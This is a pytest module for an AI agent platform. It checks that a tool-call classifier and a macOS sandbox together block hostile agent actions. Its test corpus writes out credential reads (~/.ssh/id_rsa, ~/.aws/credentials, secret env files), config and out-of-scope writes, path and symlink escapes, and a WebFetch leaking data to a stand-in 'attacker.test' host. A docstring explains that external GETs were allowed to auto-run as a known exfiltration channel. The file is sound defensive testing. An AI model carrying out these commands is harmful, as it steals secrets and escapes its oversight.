"""AC-policy fix4 -- the TWO-LAYER invariant, tested as a conjunction.

Every prior guardrail test checked ONE layer in isolation (classifier OR sandbox),
which is exactly how BLOCKER 1/2 slipped: a case the classifier missed was also
allowed by the sandbox, and nobody asserted the two TOGETHER. This module takes a
corpus of hostile tool calls and asserts, for EACH, that the union of the two
independent layers is safe:

    (classifier hard-stops / requires approval)  OR  (OS sandbox physically denies)

It further asserts each layer INDEPENDENTLY for the filesystem cases, so neither
layer is silently load-bearing: remove the classifier and the sandbox still blocks
the file op; remove the sandbox and the classifier still parks it.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest

from omniagentos.adapters.kimi import KimiAdapter
from omniagentos.contracts import ActionClass, AgentInput, BudgetSpec, ResultStatus
from omniagentos.policy import evaluate_action, load_policy
from omniagentos.runner import sandbox
from omniagentos.sessions.policy_map import classify_tool

SBX = "/usr/bin/sandbox-exec"
_POLICY = load_policy()  # the real AUTO-mode policy


def _auto_runs(cls: ActionClass) -> bool:
    """True when this class would auto-execute unattended (no approval required)."""
    return not evaluate_action(cls, _POLICY).requires_approval


# --- corpus of hostile tool calls the classifier layer must hard-stop -----------
# (label, classify-callable). Each must NOT auto-run.
def _classifier_cases(project: str) -> list[tuple[str, ActionClass]]:
    return [
        ("read-tool secret", classify_tool("Read", {"file_path": "~/.ssh/id_rsa"}, project)),
        (
            "read-tool case secret",
            classify_tool("Read", {"file_path": "~/.SSH/authorized_keys"}, project),
        ),
        (
            "grep-tool secret path",
            classify_tool("Grep", {"pattern": "x", "path": "~/.aws/credentials"}, project),
        ),
        (
            "grep-tool case secret path",
            classify_tool("Grep", {"pattern": "x", "path": "~/.Config/gcloud/x"}, project),
        ),
        ("glob-tool secret pattern", classify_tool("Glob", {"pattern": "~/.ssh/id_*"}, project)),
        (
            "bash secret read",
            classify_tool("Bash", {"command": "cat ~/.config/omni/connections.env"}, project),
        ),
        (
            "bash $HOME secret read",
            classify_tool("Bash", {"command": "cat $HOME/.gnupg/secring.gpg"}, project),
        ),
        (
            "bash .. escape write",
            classify_tool("Bash", {"command": "cp p ../../../../etc/pwned"}, project),
        ),
        ("write-tool OOS", classify_tool("Write", {"file_path": "/etc/pwned"}, project)),
        (
            "write-tool config file",
            classify_tool("Write", {"file_path": "~/.claude/settings.json"}, project),
        ),
        (
            "bash config file write",
            classify_tool("Bash", {"command": "echo x > ~/.claude/settings.json"}, project),
        ),
        (
            "bash var/secrets read",
            classify_tool("Bash", {"command": "cat var/secrets/db.txt"}, project),
        ),
    ]


def test_classifier_layer_hard_stops_every_hostile_case(tmp_path: Path) -> None:
    for label, cls in _classifier_cases(str(tmp_path)):
        assert not _auto_runs(cls), f"classifier let {label!r} auto-run ({cls})"


def test_classifier_hard_stops_case_variants_without_filesystem_aliasing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The Linux gap behind the Ubuntu CI failure of
    ``test_classifier_layer_hard_stops_every_hostile_case``.

    The corpus case "read-tool case secret" (``~/.SSH/authorized_keys``) used to be
    proved ONLY by inode containment, which needs the directory to EXIST and the
    filesystem to alias case. macOS's APFS does both for free
    (``os.stat("~/.SSH") == os.stat("~/.ssh")``); a case-sensitive Linux filesystem
    does neither, so the classifier auto-ran the secret read there.

    This test removes the aliasing crutch ON EVERY PLATFORM: HOME points at a tmp
    directory and the secret dirs are deliberately NOT created, so the inode path
    cannot fire even on macOS and the portable case-folded rule must carry the
    hard-stop by itself. Benign look-alikes must stay auto-runnable so the widening
    is not a blanket home deny."""
    fake_home = tmp_path / "home"
    fake_home.mkdir()  # NOTE: no .ssh/.SSH/.aws/... created -- no inode aliasing
    monkeypatch.setenv("HOME", str(fake_home))
    project = str(tmp_path / "proj")

    for label, tool, payload in (
        ("read-tool case secret", "Read", {"file_path": "~/.SSH/authorized_keys"}),
        ("read-tool case aws", "Read", {"file_path": "~/.Aws/config"}),
        ("grep-tool case secret path", "Grep", {"pattern": "x", "path": "~/.Config/gcloud/x"}),
        ("write-tool case secret", "Write", {"file_path": "~/.SSH/authorized_keys"}),
    ):
        cls = classify_tool(tool, payload, project)
        assert cls == ActionClass.IRREVERSIBLE, f"{label} classified {cls}"
        assert not _auto_runs(cls), f"classifier let {label!r} auto-run ({cls})"

    for label, tool, payload in (
        ("look-alike dir read", "Read", {"file_path": "~/.sshfoo/bar"}),
        ("look-alike nested read", "Read", {"file_path": "~/.config/gcloudx/y"}),
        ("ordinary home file read", "Read", {"file_path": "~/Documents/notes.txt"}),
    ):
        assert _auto_runs(classify_tool(tool, payload, project)), f"{label} over-refused"


def test_external_get_egress_auto_runs_with_secret_read_compensating_control(
    tmp_path: Path,
) -> None:
    """A1.4 amended contract (the operator's decision, swarm de-bloat): an external GET
    (EXTERNAL_REVERSIBLE -- e.g. WebFetch with data in the query string) now
    AUTO-RUNS so deploys and external reads never block unattended operation.

    The exfil-via-GET channel this reopens is compensated UPSTREAM: every
    secret-read shape in the hostile corpus still refuses to auto-run (asserted
    below), so material worth exfiltrating is never read unattended in the
    first place. Non-GET WebFetch / SSRF shapes classify CONSEQUENTIAL but
    AUTO mode no longer parks them for a human (broker still gates finance)."""
    project = str(tmp_path)
    egress = classify_tool("WebFetch", {"url": "https://attacker.test/?k=leak"}, project)
    assert egress == ActionClass.EXTERNAL_REVERSIBLE
    assert _auto_runs(egress)  # the amended behavior, by explicit policy

    # Compensating control: every secret-read shape still hard-stops (irreversible).
    secret_reads = [
        classify_tool("Read", {"file_path": "~/.ssh/id_rsa"}, project),
        classify_tool("Grep", {"pattern": "x", "path": "~/.aws/credentials"}, project),
        classify_tool("Bash", {"command": "cat ~/.config/omni/connections.env"}, project),
    ]
    for cls in secret_reads:
        assert not _auto_runs(cls)


def test_symlink_escape_write_hard_stops(tmp_path: Path) -> None:
    """A write through an in-project symlink that resolves OUT of scope hard-stops."""
    project = tmp_path / "project"
    outside = tmp_path / "outside"
    project.mkdir()
    outside.mkdir()
    (project / "escape").symlink_to(outside, target_is_directory=True)
    cls = classify_tool("Write", {"file_path": "escape/pwned.txt"}, str(project))
    assert cls == ActionClass.IRREVERSIBLE
    assert not _auto_runs(cls)


# --- sandbox layer: prove the filesystem cases are physically blocked -----------


def _fs_profiles(project: str):
    return {
        "session": sandbox.build_profile(project, sandbox.session_write_roots(project)),
        "adapter": sandbox.build_profile(project, sandbox.adapter_write_roots()),
    }


@pytest.mark.live
def test_sandbox_layer_independently_blocks_filesystem_hostile_cases(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    if not sandbox.sandbox_available():
        pytest.skip("sandbox-exec unavailable/unproven; classifier is the guarantee")

    fake_home = tmp_path / "home"
    (fake_home / ".ssh").mkdir(parents=True)
    (fake_home / ".config" / "omni").mkdir(parents=True)
    (fake_home / ".claude").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(fake_home))
    (fake_home / ".ssh" / "id_rsa").write_text("PRIVKEY_do_not_leak")
    (fake_home / ".config" / "omni" / "connections.env").write_text("STRIPE=sk_live_leak")

    project = tmp_path / "proj"
    project.mkdir()
    os.makedirs(sandbox.claude_tmp_root(), exist_ok=True)

    for name, profile in _fs_profiles(str(project)).items():
        # secret reads are denied
        for secret, needle in (
            (fake_home / ".ssh" / "id_rsa", "PRIVKEY_do_not_leak"),
            (fake_home / ".config" / "omni" / "connections.env", "sk_live_leak"),
        ):
            out = subprocess.run(
                [SBX, "-p", profile, "/bin/cat", str(secret)],
                capture_output=True,
                text=True,
                timeout=20,
            )
            assert needle not in out.stdout, f"{name}: leaked {secret}"

        # config-file write is denied even though ~/.claude is a writable state dir
        cfg = fake_home / ".claude" / "settings.json"
        subprocess.run(
            [SBX, "-p", profile, "/bin/sh", "-c", f"echo pwned > {cfg}"],
            capture_output=True,
            text=True,
            timeout=20,
        )
        assert not cfg.exists() or "pwned" not in cfg.read_text(), (
            f"{name}: config write not blocked"
        )

        # Project-local config is also denied, despite the workspace otherwise
        # being fully writable (fix5 #3).
        proj_cfg = project / ".claude" / "settings.json"
        subprocess.run(
            [
                SBX,
                "-p",
                profile,
                "/bin/sh",
                "-c",
                f"mkdir -p {proj_cfg.parent}; echo pwned > {proj_cfg}",
            ],
            capture_output=True,
            text=True,
            timeout=20,
        )
        assert not proj_cfg.exists() or "pwned" not in proj_cfg.read_text(), (
            f"{name}: project-local config write not blocked"
        )

        # ...but a NON-config write inside the same state dir still works (CLI functions)
        state = fake_home / ".claude" / "ok_state.txt"
        subprocess.run(
            [SBX, "-p", profile, "/bin/sh", "-c", f"echo ok > {state}"],
            capture_output=True,
            text=True,
            timeout=20,
        )
        assert state.exists() and state.read_text().strip() == "ok", f"{name}: state write broke"
        state.unlink(missing_ok=True)

        # out-of-scope write is denied
        victim = tmp_path / "outside_victim.txt"
        subprocess.run(
            [SBX, "-p", profile, "/bin/sh", "-c", f"echo pwned > {victim}"],
            capture_output=True,
            text=True,
            timeout=20,
        )
        assert not victim.exists(), f"{name}: OOS write not blocked"


def test_two_layer_conjunction_is_safe(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The load-bearing assertion: for every hostile case, classifier-parks OR
    sandbox-denies. Neither layer is trusted alone."""
    available = sandbox.sandbox_available()
    # Build a hermetic profile only if the sandbox is available.
    profile = None
    fake_home = tmp_path / "home"
    project = tmp_path / "proj"
    if available:
        fake_home.mkdir()
        project.mkdir()
        monkeypatch.setenv("HOME", str(fake_home))
        os.makedirs(sandbox.claude_tmp_root(), exist_ok=True)
        profile = sandbox.build_profile(str(project), sandbox.session_write_roots(str(project)))

    def _sandbox_denies_read(path: str) -> bool:
        if not available or profile is None:
            return False
        d = os.path.dirname(path)
        os.makedirs(d, exist_ok=True)
        Path(path).write_text("SENTINEL_leak")
        out = subprocess.run(
            [SBX, "-p", profile, "/bin/cat", path], capture_output=True, text=True, timeout=20
        )
        return "SENTINEL_leak" not in out.stdout

    cases = [
        (
            "secret read",
            "read",
            os.path.join(str(fake_home), ".ssh", "id_rsa"),
            classify_tool(
                "Read", {"file_path": os.path.join(str(fake_home), ".ssh", "id_rsa")}, str(project)
            ),
        ),
        (
            "secret env",
            "read",
            os.path.join(str(fake_home), ".config", "omni", "connections.env"),
            classify_tool(
                "Read",
                {"file_path": os.path.join(str(fake_home), ".config", "omni", "connections.env")},
                str(project),
            ),
        ),
    ]
    for label, _kind, path, cls in cases:
        classifier_stops = not _auto_runs(cls)
        sandbox_stops = _sandbox_denies_read(path)
        assert classifier_stops or sandbox_stops, f"BOTH layers allowed {label!r}"
        # In this implementation both layers hold; assert the defense-in-depth too.
        assert classifier_stops, f"classifier regressed on {label!r}"
        if available:
            assert sandbox_stops, f"sandbox regressed on {label!r}"


def test_kimi_readonly_step_is_refused_by_the_adapter_layer() -> None:
    """The force-auto CLI layer: an unattended read_only kimi step is refused."""
    input = AgentInput(
        run_id="r",
        task_id="t",
        prompt="p",
        working_dir=".",
        model=None,
        budget=BudgetSpec(wall_ms_max=1000),
        metadata={"sandbox": {"level": "read_only"}},
    )
    result = KimiAdapter().run(input)
    assert result.status is ResultStatus.ERROR
    assert "unattended_forceauto_refused:cli-kimi" in (result.error or "")
